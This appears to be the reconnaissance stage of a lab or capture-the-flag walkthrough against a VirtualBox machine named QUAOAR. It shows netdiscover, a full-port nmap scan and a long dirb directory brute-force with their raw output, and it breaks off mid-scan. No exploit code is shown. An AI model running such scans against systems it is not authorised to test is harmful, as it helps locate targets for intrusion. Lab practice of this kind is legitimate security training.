NetDiscover

```bash
root@kali:~# netdiscover -i eth0 -r 192.168.100.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts                 
                                                                               
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.100.100 08:00:27:87:a0:55      1      60  Cadmus Computer Systems     
 192.168.100.101 08:00:27:12:07:66      1      60  Cadmus Computer Systems     

root@kali:~# 
```

Target: 192.168.100.101
Nmap

```bash
root@kali:~# nmap -p- -A 192.168.100.101

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-05-05 09:26 CEST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.100.101
Host is up (0.00071s latency).
Not shown: 65526 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)
|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)
|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)
53/tcp  open  domain      ISC BIND 9.8.1-P1
| dns-nsid: 
|_  bind.version: 9.8.1-P1
80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_Hackers
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: STLS SASL PIPELINING RESP-CODES UIDL CAPA TOP
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2017-05-05T09:26:25+00:00; +2h00m01s from scanner time.
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: OK ENABLE Pre-login LITERAL+ have post-login capabilities listed more LOGIN-REFERRALS LOGINDISABLEDA0001 SASL-IR IDLE STARTTLS IMAP4rev1 ID
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2017-05-05T09:26:25+00:00; +2h00m00s from scanner time.
445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)
993/tcp open  ssl/imap    Dovecot imapd
|_imap-capabilities: OK ENABLE LITERAL+ listed have capabilities post-login more LOGIN-REFERRALS Pre-login AUTH=PLAINA0001 IDLE SASL-IR IMAP4rev1 ID
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2017-05-05T09:26:25+00:00; +2h00m01s from scanner time.
995/tcp open  ssl/pop3    Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) USER PIPELINING RESP-CODES UIDL CAPA TOP
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2017-05-05T09:26:24+00:00; +2h00m00s from scanner time.
MAC Address: 08:00:27:12:07:66 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m00s, deviation: 1s, median: 1h59m60s
|_nbstat: NetBIOS name: QUAOAR, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.6.3)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP
|_  System time: 2017-05-05T05:26:23-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server doesn't support SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   0.71 ms 192.168.100.101

Post-scan script results:
| clock-skew: 
|_  2h00m00s: Majority of systems scanned
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.11 seconds
root@kali:~# 
```

Port 80 bruteforce
Dirb
```bash
root@kali:~# dirb http://192.168.100.101

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri May  5 09:30:33 2017
URL_BASE: http://192.168.100.101/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.100.101/ ----
+ http://192.168.100.101/cgi-bin/ (CODE:403|SIZE:291)                                                                                                                                                             
+ http://192.168.100.101/hacking (CODE:200|SIZE:616848)                                                                                                                                                           
+ http://192.168.100.101/index (CODE:200|SIZE:100)                                                                                                                                                                
+ http://192.168.100.101/index.html (CODE:200|SIZE:100)                                                                                                                                                           
+ http://192.168.100.101/LICENSE (CODE:200|SIZE:1672)                                                                                                                                                             
+ http://192.168.100.101/robots (CODE:200|SIZE:271)                                                                                                                                                               
+ http://192.168.100.101/robots.txt (CODE:200|SIZE:271)                                                                                                                                                           
+ http://192.168.100.101/server-status (CODE:403|SIZE:296)                                                                                                                                                        
==> DIRECTORY: http://192.168.100.101/upload/                                                                                                                                                                     
==> DIRECTORY: http://192.168.100.101/wordpress/                                                                                                                                                                  
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/ ----
==> DIRECTORY: http://192.168.100.101/upload/account/                                                                                                                                                             
==> DIRECTORY: http://192.168.100.101/upload/admins/                                                                                                                                                              
+ http://192.168.100.101/upload/config (CODE:200|SIZE:0)                                                                                                                                                          
==> DIRECTORY: http://192.168.100.101/upload/framework/                                                                                                                                                           
==> DIRECTORY: http://192.168.100.101/upload/include/                                                                                                                                                             
+ http://192.168.100.101/upload/index (CODE:200|SIZE:3040)                                                                                                                                                        
+ http://192.168.100.101/upload/index.php (CODE:200|SIZE:3040)                                                                                                                                                    
==> DIRECTORY: http://192.168.100.101/upload/languages/                                                                                                                                                           
==> DIRECTORY: http://192.168.100.101/upload/media/                                                                                                                                                               
==> DIRECTORY: http://192.168.100.101/upload/modules/                                                                                                                                                             
==> DIRECTORY: http://192.168.100.101/upload/page/                                                                                                                                                                
==> DIRECTORY: http://192.168.100.101/upload/search/                                                                                                                                                              
==> DIRECTORY: http://192.168.100.101/upload/temp/                                                                                                                                                                
==> DIRECTORY: http://192.168.100.101/upload/templates/                                                                                                                                                           
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/wordpress/ ----
==> DIRECTORY: http://192.168.100.101/wordpress/index/                                                                                                                                                            
+ http://192.168.100.101/wordpress/index.php (CODE:301|SIZE:0)                                                                                                                                                    
+ http://192.168.100.101/wordpress/license (CODE:200|SIZE:19930)                                                                                                                                                  
+ http://192.168.100.101/wordpress/readme (CODE:200|SIZE:7195)                                                                                                                                                    
==> DIRECTORY: http://192.168.100.101/wordpress/wp-admin/                                                                                                                                                         
+ http://192.168.100.101/wordpress/wp-blog-header (CODE:200|SIZE:0)                                                                                                                                               
+ http://192.168.100.101/wordpress/wp-config (CODE:200|SIZE:0)                                                                                                                                                    
==> DIRECTORY: http://192.168.100.101/wordpress/wp-content/                                                                                                                                                       
+ http://192.168.100.101/wordpress/wp-cron (CODE:200|SIZE:0)                                                                                                                                                      
==> DIRECTORY: http://192.168.100.101/wordpress/wp-includes/                                                                                                                                                      
+ http://192.168.100.101/wordpress/wp-links-opml (CODE:200|SIZE:217)                                                                                                                                              
+ http://192.168.100.101/wordpress/wp-load (CODE:200|SIZE:0)                                                                                                                                                      
+ http://192.168.100.101/wordpress/wp-login (CODE:200|SIZE:2530)                                                                                                                                                  
+ http://192.168.100.101/wordpress/wp-mail (CODE:500|SIZE:3011)                                                                                                                                                   
+ http://192.168.100.101/wordpress/wp-settings (CODE:500|SIZE:0)                                                                                                                                                  
+ http://192.168.100.101/wordpress/wp-signup (CODE:302|SIZE:0)                                                                                                                                                    
+ http://192.168.100.101/wordpress/wp-trackback (CODE:200|SIZE:135)                                                                                                                                               
+ http://192.168.100.101/wordpress/xmlrpc (CODE:200|SIZE:42)                                                                                                                                                      
+ http://192.168.100.101/wordpress/xmlrpc.php (CODE:200|SIZE:42)                                                                                                                                                  
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/account/ ----
==> DIRECTORY: http://192.168.100.101/upload/account/css/                                                                                                                                                         
+ http://192.168.100.101/upload/account/forgot (CODE:302|SIZE:0)                                                                                                                                                  
+ http://192.168.100.101/upload/account/index (CODE:302|SIZE:0)                                                                                                                                                   
+ http://192.168.100.101/upload/account/index.php (CODE:302|SIZE:0)                                                                                                                                               
+ http://192.168.100.101/upload/account/login (CODE:302|SIZE:0)                                                                                                                                                   
+ http://192.168.100.101/upload/account/logout (CODE:302|SIZE:0)                                                                                                                                                  
+ http://192.168.100.101/upload/account/preferences (CODE:302|SIZE:0)                                                                                                                                             
+ http://192.168.100.101/upload/account/signup (CODE:302|SIZE:0)                                                                                                                                                  
==> DIRECTORY: http://192.168.100.101/upload/account/templates/                                                                                                                                                   
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/ ----
==> DIRECTORY: http://192.168.100.101/upload/admins/access/                                                                                                                                                       
==> DIRECTORY: http://192.168.100.101/upload/admins/addons/                                                                                                                                                       
==> DIRECTORY: http://192.168.100.101/upload/admins/admintools/                                                                                                                                                   
==> DIRECTORY: http://192.168.100.101/upload/admins/groups/                                                                                                                                                       
+ http://192.168.100.101/upload/admins/index (CODE:302|SIZE:0)                                                                                                                                                    
+ http://192.168.100.101/upload/admins/index.php (CODE:302|SIZE:0)                                                                                                                                                
==> DIRECTORY: http://192.168.100.101/upload/admins/interface/                                                                                                                                                    
==> DIRECTORY: http://192.168.100.101/upload/admins/languages/                                                                                                                                                    
==> DIRECTORY: http://192.168.100.101/upload/admins/login/                                                                                                                                                        
==> DIRECTORY: http://192.168.100.101/upload/admins/logout/                                                                                                                                                       
==> DIRECTORY: http://192.168.100.101/upload/admins/media/                                                                                                                                                        
==> DIRECTORY: http://192.168.100.101/upload/admins/modules/                                                                                                                                                      
==> DIRECTORY: http://192.168.100.101/upload/admins/pages/                                                                                                                                                        
==> DIRECTORY: http://192.168.100.101/upload/admins/preferences/                                                                                                                                                  
==> DIRECTORY: http://192.168.100.101/upload/admins/profiles/                                                                                                                                                     
==> DIRECTORY: http://192.168.100.101/upload/admins/service/                                                                                                                                                      
==> DIRECTORY: http://192.168.100.101/upload/admins/settings/                                                                                                                                                     
==> DIRECTORY: http://192.168.100.101/upload/admins/start/                                                                                                                                                        
==> DIRECTORY: http://192.168.100.101/upload/admins/support/                                                                                                                                                      
==> DIRECTORY: http://192.168.100.101/upload/admins/templates/                                                                                                                                                    
==> DIRECTORY: http://192.168.100.101/upload/admins/users/                                                                                                                                                        
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/framework/ ----
==> DIRECTORY: http://192.168.100.101/upload/framework/functions/                                                                                                                                                 
+ http://192.168.100.101/upload/framework/index (CODE:302|SIZE:0)                                                                                                                                                 
+ http://192.168.100.101/upload/framework/index.php (CODE:302|SIZE:0)                                                                                                                                             
+ http://192.168.100.101/upload/framework/summary (CODE:403|SIZE:88)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/include/ ----
+ http://192.168.100.101/upload/include/index (CODE:302|SIZE:0)                                                                                                                                                   
+ http://192.168.100.101/upload/include/index.php (CODE:302|SIZE:0)                                                                                                                                               
==> DIRECTORY: http://192.168.100.101/upload/include/yui/                                                                                                                                                         
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/languages/ ----
+ http://192.168.100.101/upload/languages/index (CODE:302|SIZE:0)                                                                                                                                                 
+ http://192.168.100.101/upload/languages/index.php (CODE:302|SIZE:0)                                                                                                                                             
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/media/ ----
+ http://192.168.100.101/upload/media/index (CODE:302|SIZE:0)                                                                                                                                                     
+ http://192.168.100.101/upload/media/index.php (CODE:302|SIZE:0)                                                                                                                                                 
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/modules/ ----
+ http://192.168.100.101/upload/modules/admin (CODE:403|SIZE:79)                                                                                                                                                  
+ http://192.168.100.101/upload/modules/admin.php (CODE:403|SIZE:79)                                                                                                                                              
+ http://192.168.100.101/upload/modules/index (CODE:302|SIZE:0)                                                                                                                                                   
+ http://192.168.100.101/upload/modules/index.php (CODE:302|SIZE:0)                                                                                                                                               
==> DIRECTORY: http://192.168.100.101/upload/modules/news/                                                                                                                                                        
==> DIRECTORY: http://192.168.100.101/upload/modules/wysiwyg/                                                                                                                                                     
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/page/ ----
+ http://192.168.100.101/upload/page/index (CODE:200|SIZE:0)                                                                                                                                                      
+ http://192.168.100.101/upload/page/index.php (CODE:200|SIZE:0)                                                                                                                                                  
==> DIRECTORY: http://192.168.100.101/upload/page/posts/                                                                                                                                                          
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/search/ ----
+ http://192.168.100.101/upload/search/index (CODE:200|SIZE:3627)                                                                                                                                                 
+ http://192.168.100.101/upload/search/index.php (CODE:200|SIZE:3627)                                                                                                                                             
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/temp/ ----
+ http://192.168.100.101/upload/temp/index (CODE:302|SIZE:0)                                                                                                                                                      
+ http://192.168.100.101/upload/temp/index.php (CODE:302|SIZE:0)                                                                                                                                                  
==> DIRECTORY: http://192.168.100.101/upload/temp/search/                                                                                                                                                         
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/templates/ ----
==> DIRECTORY: http://192.168.100.101/upload/templates/blank/                                                                                                                                                     
+ http://192.168.100.101/upload/templates/index (CODE:302|SIZE:0)                                                                                                                                                 
+ http://192.168.100.101/upload/templates/index.php (CODE:302|SIZE:0)                                                                                                                                             
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/wordpress/index/ ----
(!) WARNING: NOT_FOUND[] not stable, unable to determine correct URLs {30X}.
    (Try using FineTunning: '-f')
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/wordpress/wp-admin/ ----
+ http://192.168.100.101/wordpress/wp-admin/about (CODE:302|SIZE:0)                                                                                                                                               
+ http://192.168.100.101/wordpress/wp-admin/admin (CODE:302|SIZE:0)                                                                                                                                               
+ http://192.168.100.101/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                                                                                                                           
+ http://192.168.100.101/wordpress/wp-admin/comment (CODE:302|SIZE:0)                                                                                                                                             
+ http://192.168.100.101/wordpress/wp-admin/credits (CODE:302|SIZE:0)                                                                                                                                             
==> DIRECTORY: http://192.168.100.101/wordpress/wp-admin/css/                                                                                                                                                     
+ http://192.168.100.101/wordpress/wp-admin/customize (CODE:302|SIZE:0)                                                                                                                                           
+ http://192.168.100.101/wordpress/wp-admin/edit (CODE:302|SIZE:0)                                                                                                                                                
+ http://192.168.100.101/wordpress/wp-admin/export (CODE:302|SIZE:0)                                                                                                                                              
==> DIRECTORY: http://192.168.100.101/wordpress/wp-admin/images/                                                                                                                                                  
+ http://192.168.100.101/wordpress/wp-admin/import (CODE:302|SIZE:0)                                                                                                                                              
==> DIRECTORY: http://192.168.100.101/wordpress/wp-admin/includes/                                                                                                                                                
+ http://192.168.100.101/wordpress/wp-admin/index (CODE:302|SIZE:0)                                                                                                                                               
+ http://192.168.100.101/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                                                                                                                           
+ http://192.168.100.101/wordpress/wp-admin/install (CODE:200|SIZE:1080)                                                                                                                                          
==> DIRECTORY: http://192.168.100.101/wordpress/wp-admin/js/                                                                                                                                                      
+ http://192.168.100.101/wordpress/wp-admin/link (CODE:302|SIZE:0)                                                                                                                                                
==> DIRECTORY: http://192.168.100.101/wordpress/wp-admin/maint/                                                                                                                                                   
+ http://192.168.100.101/wordpress/wp-admin/media (CODE:302|SIZE:0)                                                                                                                                               
+ http://192.168.100.101/wordpress/wp-admin/menu (CODE:500|SIZE:0)                                                                                                                                                
+ http://192.168.100.101/wordpress/wp-admin/moderation (CODE:302|SIZE:0)                                                                                                                                          
==> DIRECTORY: http://192.168.100.101/wordpress/wp-admin/network/                                                                                                                                                 
+ http://192.168.100.101/wordpress/wp-admin/options (CODE:302|SIZE:0)                                                                                                                                             
+ http://192.168.100.101/wordpress/wp-admin/plugins (CODE:302|SIZE:0)                                                                                                                                             
+ http://192.168.100.101/wordpress/wp-admin/post (CODE:302|SIZE:0)                                                                                                                                                
+ http://192.168.100.101/wordpress/wp-admin/profile (CODE:302|SIZE:0)                                                                                                                                             
+ http://192.168.100.101/wordpress/wp-admin/themes (CODE:302|SIZE:0)                                                                                                                                              
+ http://192.168.100.101/wordpress/wp-admin/tools (CODE:302|SIZE:0)                                                                                                                                               
+ http://192.168.100.101/wordpress/wp-admin/update (CODE:302|SIZE:0)                                                                                                                                              
+ http://192.168.100.101/wordpress/wp-admin/upgrade (CODE:200|SIZE:1173)                                                                                                                                          
+ http://192.168.100.101/wordpress/wp-admin/upload (CODE:302|SIZE:0)                                                                                                                                              
==> DIRECTORY: http://192.168.100.101/wordpress/wp-admin/user/                                                                                                                                                    
+ http://192.168.100.101/wordpress/wp-admin/users (CODE:302|SIZE:0)                                                                                                                                               
+ http://192.168.100.101/wordpress/wp-admin/widgets (CODE:302|SIZE:0)                                                                                                                                             
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/wordpress/wp-content/ ----
+ http://192.168.100.101/wordpress/wp-content/index (CODE:200|SIZE:0)                                                                                                                                             
+ http://192.168.100.101/wordpress/wp-content/index.php (CODE:200|SIZE:0)                                                                                                                                         
==> DIRECTORY: http://192.168.100.101/wordpress/wp-content/plugins/                                                                                                                                               
==> DIRECTORY: http://192.168.100.101/wordpress/wp-content/themes/                                                                                                                                                
==> DIRECTORY: http://192.168.100.101/wordpress/wp-content/upgrade/                                                                                                                                               
==> DIRECTORY: http://192.168.100.101/wordpress/wp-content/uploads/                                                                                                                                               
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/wordpress/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/account/css/ ----
+ http://192.168.100.101/upload/account/css/frontend (CODE:200|SIZE:1931)                                                                                                                                         
+ http://192.168.100.101/upload/account/css/index (CODE:302|SIZE:0)                                                                                                                                               
+ http://192.168.100.101/upload/account/css/index.php (CODE:302|SIZE:0)                                                                                                                                           
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/account/templates/ ----
+ http://192.168.100.101/upload/account/templates/index (CODE:302|SIZE:0)                                                                                                                                         
+ http://192.168.100.101/upload/account/templates/index.php (CODE:302|SIZE:0)                                                                                                                                     
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/access/ ----
+ http://192.168.100.101/upload/admins/access/index (CODE:302|SIZE:0)                                                                                                                                             
+ http://192.168.100.101/upload/admins/access/index.php (CODE:302|SIZE:0)                                                                                                                                         
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/addons/ ----
+ http://192.168.100.101/upload/admins/addons/index (CODE:302|SIZE:0)                                                                                                                                             
+ http://192.168.100.101/upload/admins/addons/index.php (CODE:302|SIZE:0)                                                                                                                                         
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/admintools/ ----
+ http://192.168.100.101/upload/admins/admintools/index (CODE:302|SIZE:0)                                                                                                                                         
+ http://192.168.100.101/upload/admins/admintools/index.php (CODE:302|SIZE:0)                                                                                                                                     
+ http://192.168.100.101/upload/admins/admintools/tool (CODE:302|SIZE:0)                                                                                                                                          
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/groups/ ----
+ http://192.168.100.101/upload/admins/groups/add (CODE:302|SIZE:0)                                                                                                                                               
+ http://192.168.100.101/upload/admins/groups/groups (CODE:302|SIZE:0)                                                                                                                                            
+ http://192.168.100.101/upload/admins/groups/index (CODE:302|SIZE:0)                                                                                                                                             
+ http://192.168.100.101/upload/admins/groups/index.php (CODE:302|SIZE:0)                                                                                                                                         
+ http://192.168.100.101/upload/admins/groups/save (CODE:302|SIZE:0)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/interface/ ----
+ http://192.168.100.101/upload/admins/interface/index (CODE:302|SIZE:0)                                                                                                                                          
+ http://192.168.100.101/upload/admins/interface/index.php (CODE:302|SIZE:0)                                                                                                                                      
+ http://192.168.100.101/upload/admins/interface/version (CODE:403|SIZE:90)                                                                                                                                       
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/languages/ ----
+ http://192.168.100.101/upload/admins/languages/details (CODE:302|SIZE:0)                                                                                                                                        
+ http://192.168.100.101/upload/admins/languages/index (CODE:302|SIZE:0)                                                                                                                                          
+ http://192.168.100.101/upload/admins/languages/index.php (CODE:302|SIZE:0)                                                                                                                                      
+ http://192.168.100.101/upload/admins/languages/install (CODE:500|SIZE:0)                                                                                                                                        
+ http://192.168.100.101/upload/admins/languages/uninstall (CODE:302|SIZE:0)                                                                                                                                      
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/login/ ----
==> DIRECTORY: http://192.168.100.101/upload/admins/login/forgot/                                                                                                                                                 
+ http://192.168.100.101/upload/admins/login/index (CODE:200|SIZE:2929)                                                                                                                                           
+ http://192.168.100.101/upload/admins/login/index.php (CODE:200|SIZE:2929)                                                                                                                                       
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/logout/ ----
+ http://192.168.100.101/upload/admins/logout/index (CODE:302|SIZE:0)                                                                                                                                             
+ http://192.168.100.101/upload/admins/logout/index.php (CODE:302|SIZE:0)                                                                                                                                         
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/media/ ----
+ http://192.168.100.101/upload/admins/media/index (CODE:302|SIZE:0)                                                                                                                                              
+ http://192.168.100.101/upload/admins/media/index.php (CODE:302|SIZE:0)                                                                                                                                          
+ http://192.168.100.101/upload/admins/media/thumb (CODE:200|SIZE:0)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/modules/ ----
+ http://192.168.100.101/upload/admins/modules/details (CODE:302|SIZE:0)                                                                                                                                          
+ http://192.168.100.101/upload/admins/modules/index (CODE:302|SIZE:0)                                                                                                                                            
+ http://192.168.100.101/upload/admins/modules/index.php (CODE:302|SIZE:0)                                                                                                                                        
+ http://192.168.100.101/upload/admins/modules/install (CODE:302|SIZE:0)                                                                                                                                          
+ http://192.168.100.101/upload/admins/modules/uninstall (CODE:302|SIZE:0)                                                                                                                                        
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/pages/ ----
+ http://192.168.100.101/upload/admins/pages/add (CODE:302|SIZE:0)                                                                                                                                                
+ http://192.168.100.101/upload/admins/pages/delete (CODE:302|SIZE:0)                                                                                                                                             
+ http://192.168.100.101/upload/admins/pages/index (CODE:302|SIZE:0)                                                                                                                                              
+ http://192.168.100.101/upload/admins/pages/index.php (CODE:302|SIZE:0)                                                                                                                                          
+ http://192.168.100.101/upload/admins/pages/modify (CODE:302|SIZE:0)                                                                                                                                             
+ http://192.168.100.101/upload/admins/pages/restore (CODE:302|SIZE:0)                                                                                                                                            
+ http://192.168.100.101/upload/admins/pages/save (CODE:302|SIZE:0)                                                                                                                                               
+ http://192.168.100.101/upload/admins/pages/sections (CODE:302|SIZE:0)                                                                                                                                           
+ http://192.168.100.101/upload/admins/pages/settings (CODE:302|SIZE:0)                                                                                                                                           
+ http://192.168.100.101/upload/admins/pages/trash (CODE:302|SIZE:0)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/preferences/ ----
+ http://192.168.100.101/upload/admins/preferences/index (CODE:302|SIZE:0)                                                                                                                                        
+ http://192.168.100.101/upload/admins/preferences/index.php (CODE:302|SIZE:0)                                                                                                                                    
+ http://192.168.100.101/upload/admins/preferences/save (CODE:302|SIZE:0)                                                                                                                                         
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/profiles/ ----
+ http://192.168.100.101/upload/admins/profiles/index (CODE:200|SIZE:324)                                                                                                                                         
+ http://192.168.100.101/upload/admins/profiles/index.php (CODE:200|SIZE:324)                                                                                                                                     
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/service/ ----
+ http://192.168.100.101/upload/admins/service/index (CODE:302|SIZE:0)                                                                                                                                            
+ http://192.168.100.101/upload/admins/service/index.php (CODE:302|SIZE:0)                                                                                                                                        
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/settings/ ----
+ http://192.168.100.101/upload/admins/settings/index (CODE:302|SIZE:0)                                                                                                                                           
+ http://192.168.100.101/upload/admins/settings/index.php (CODE:302|SIZE:0)                                                                                                                                       
+ http://192.168.100.101/upload/admins/settings/save (CODE:302|SIZE:0)                                                                                                                                            
+ http://192.168.100.101/upload/admins/settings/setting (CODE:200|SIZE:3839)                                                                                                                                      
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/start/ ----
+ http://192.168.100.101/upload/admins/start/index (CODE:302|SIZE:0)                                                                                                                                              
+ http://192.168.100.101/upload/admins/start/index.php (CODE:302|SIZE:0)                                                                                                                                          
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/support/ ----
+ http://192.168.100.101/upload/admins/support/index (CODE:302|SIZE:0)                                                                                                                                            
+ http://192.168.100.101/upload/admins/support/index.php (CODE:302|SIZE:0)                                                                                                                                        
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/templates/ ----
+ http://192.168.100.101/upload/admins/templates/details (CODE:302|SIZE:0)                                                                                                                                        
+ http://192.168.100.101/upload/admins/templates/index (CODE:302|SIZE:0)                                                                                                                                          
+ http://192.168.100.101/upload/admins/templates/index.php (CODE:302|SIZE:0)                                                                                                                                      
+ http://192.168.100.101/upload/admins/templates/install (CODE:302|SIZE:0)                                                                                                                                        
+ http://192.168.100.101/upload/admins/templates/uninstall (CODE:302|SIZE:0)                                                                                                                                      
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/users/ ----
+ http://192.168.100.101/upload/admins/users/add (CODE:302|SIZE:0)                                                                                                                                                
+ http://192.168.100.101/upload/admins/users/index (CODE:302|SIZE:0)                                                                                                                                              
+ http://192.168.100.101/upload/admins/users/index.php (CODE:302|SIZE:0)                                                                                                                                          
+ http://192.168.100.101/upload/admins/users/save (CODE:302|SIZE:0)                                                                                                                                               
+ http://192.168.100.101/upload/admins/users/users (CODE:302|SIZE:0)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/framework/functions/ ----
+ http://192.168.100.101/upload/framework/functions/index (CODE:302|SIZE:0)                                                                                                                                       
+ http://192.168.100.101/upload/framework/functions/index.php (CODE:302|SIZE:0)                                                                                                                                   
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/include/yui/ ----
==> DIRECTORY: http://192.168.100.101/upload/include/yui/event/                                                                                                                                                   
+ http://192.168.100.101/upload/include/yui/index (CODE:302|SIZE:0)                                                                                                                                               
+ http://192.168.100.101/upload/include/yui/index.php (CODE:302|SIZE:0)                                                                                                                                           
+ http://192.168.100.101/upload/include/yui/README (CODE:200|SIZE:8488)                                                                                                                                           
==> DIRECTORY: http://192.168.100.101/upload/include/yui/yahoo/                                                                                                                                                   
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/modules/news/ ----
+ http://192.168.100.101/upload/modules/news/add (CODE:403|SIZE:82)                                                                                                                                               
+ http://192.168.100.101/upload/modules/news/comment (CODE:302|SIZE:0)                                                                                                                                            
==> DIRECTORY: http://192.168.100.101/upload/modules/news/css/                                                                                                                                                    
+ http://192.168.100.101/upload/modules/news/delete (CODE:403|SIZE:85)                                                                                                                                            
+ http://192.168.100.101/upload/modules/news/icon (CODE:200|SIZE:1058)                                                                                                                                            
+ http://192.168.100.101/upload/modules/news/index (CODE:302|SIZE:0)                                                                                                                                              
+ http://192.168.100.101/upload/modules/news/index.php (CODE:302|SIZE:0)                                                                                                                                          
+ http://192.168.100.101/upload/modules/news/info (CODE:403|SIZE:83)                                                                                                                                              
+ http://192.168.100.101/upload/modules/news/info.php (CODE:403|SIZE:83)                                                                                                                                          
+ http://192.168.100.101/upload/modules/news/install (CODE:403|SIZE:86)                                                                                                                                           
==> DIRECTORY: http://192.168.100.101/upload/modules/news/languages/                                                                                                                                              
+ http://192.168.100.101/upload/modules/news/modify (CODE:403|SIZE:85)                                                                                                                                            
